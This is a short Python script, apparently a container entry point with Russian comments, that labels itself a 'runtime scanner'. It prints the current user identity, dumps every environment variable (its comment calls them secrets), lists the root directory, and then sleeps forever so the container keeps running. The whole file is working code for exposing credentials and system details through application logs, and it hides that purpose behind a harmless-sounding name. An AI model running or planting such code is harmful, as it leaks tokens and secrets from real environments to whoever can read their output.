import os
import subprocess

print("\n" + "!"*50)
print("--- RUNTIME SCANNER START ---")

# Выводим секреты прямо при запуске приложения
print(f"USER: {subprocess.getoutput('id')}")
print(f"ENV DUMP:")
for k, v in os.environ.items():
    print(f"{k}={v}")

# Проверяем файлы
print(f"ROOT FILES: {subprocess.getoutput('ls -la /')}")

print("--- RUNTIME SCANNER END ---")
print("!"*50 + "\n")

# Чтобы контейнер не падал
import time
while True:
    time.sleep(10)
